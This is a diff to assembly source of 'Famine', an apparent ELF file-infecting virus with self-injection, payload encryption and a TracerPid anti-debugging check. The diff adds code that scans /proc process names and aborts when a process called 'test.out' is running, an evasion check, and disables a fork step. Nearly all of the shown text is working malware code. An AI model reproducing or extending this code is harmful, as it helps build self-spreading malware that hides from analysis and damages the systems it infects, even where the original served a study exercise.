@@ -41,6 +41,132 @@ add r12, 12
 cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
 jne _exx_pop
 
+
+
+.opendir_proc:
+	lea rdi, [rel pdir]
+	mov rsi, O_RDONLY | O_DIRECTORY
+	mov rax, _open
+	syscall
+	test eax, eax
+	jl _exx_pop
+	mov r14, rax
+
+.readdir_proc:
+	mov rdx, DIRENT_ARR_SIZE
+	lea rsi, STACK(famine.dirents_proc)
+	mov rdi, r14
+	mov rax, _getdents
+	syscall
+	test rax, rax
+	jle .closedir_proc
+	mov r13, 0
+	mov r12, rax
+	call .read_file
+	jmp .readdir_proc
+
+.closedir_proc:
+	mov rdi, r14
+	mov rax, _close
+	syscall
+	jmp .OUI
+
+
+.read_file:
+	lea rdi, STACK(famine.dirents_proc)
+	add rdi, r13
+	movzx edx, word[rdi+dirent.d_reclen]
+	mov al, byte[rdi + rdx - 1]
+	add rdi, dirent.d_name
+	add r13, rdx
+	cmp al, DT_DIR
+	jne .nextfile_proc
+
+
+lea r11, [rel pdir]
+xor rsi, rsi
+
+.dirname_proc:
+	mov al, byte[r11]
+	mov byte[rel commpath + rsi], al
+	inc rsi
+	cmp rsi, 6
+	inc r11
+	jb .dirname_proc
+
+.filename_proc:
+	mov al, byte[rdi]
+	mov byte[rel commpath + rsi], al
+	inc rsi
+	inc rdi
+	cmp byte[rdi], 0
+	jne .filename_proc
+
+lea r11, [rel pname]
+mov rdx, 0
+.commfile:
+	mov al, byte[r11]
+	mov byte[rel commpath + rsi], al
+	inc r11
+	inc rsi
+	inc rdx
+	cmp rdx, 5
+	jne .commfile
+	mov byte[rel commpath + rsi], 0
+
+
+	mov rax, _open
+	lea rdi, [rel commpath]
+	mov rdx, O_RDWR
+	syscall
+	test eax, eax
+	jl .nextfile_proc
+
+	mov rdi, rax
+	mov rax, _read
+	lea rsi, [rel thename]
+	mov rdx, 90
+	syscall
+	test eax, eax
+	jl .close_proc
+	mov byte[rsi + rax - 1], 0x0
+	push rdi
+	lea rdi, [rel forbidden]
+	call .strcmp
+	cmp rax, 0
+	je _exx_pop
+	pop rdi
+	.close_proc:
+	mov rax, _close
+	syscall
+	jmp .nextfile_proc
+
+
+.strcmp:
+	mov r10b, BYTE [rdi]
+	mov r11b, BYTE [rsi]
+	cmp r10b, 0
+	je .end_cmp
+	cmp r11b, 0
+	je .end_cmp
+	cmp r10b, r11b
+	jne .end_cmp
+	inc rdi
+	inc rsi
+	jmp .strcmp
+
+.end_cmp:
+	movzx rax, r10b
+	movzx rbx, r11b
+	sub rax, rbx
+	ret
+
+.nextfile_proc:
+	cmp r13, r12
+	jl .read_file
+	ret
+
+
 .OUI:
 
 jmp .enc_start
@@ -48,10 +174,10 @@ DECYPHER
 
 
 .enc_start:
-	mov rax, _fork
-	syscall
-	cmp rax, 0
-	jne _exx_pop
+;	mov rax, _fork
+;	syscall
+;	cmp rax, 0
+;	jne _exx_pop
 
 .get_rand_key:
 	lea rdi, [rel random]
@@ -277,6 +403,7 @@ inject_self:
 		dec rdx
 		cmp rdx, 0
 		jg .loading_v
+	
 	CYPHER
 
 	mov rdi, STACK(famine.file_fd) ; fd to rdi
@@ -396,8 +523,11 @@ enc_end:
 	db 0
 signature		db			0x00, 'Famine version 99.0 (c)oded by <araout>', 0xa, 0x00
 pfile			db			"/proc/self/status",0
-pdir			db			"/proc/",0
-pname			db			"/comm",0
+pdir			db			"/proc/", 0, 0, 0, 0
+pname			db			"/comm"
+forbidden		db			"test.out", 0
+commpath		times	100		db	0
+thename			times	100		db	0
 famine_entry	dq			_start
 
 _exx_pop:
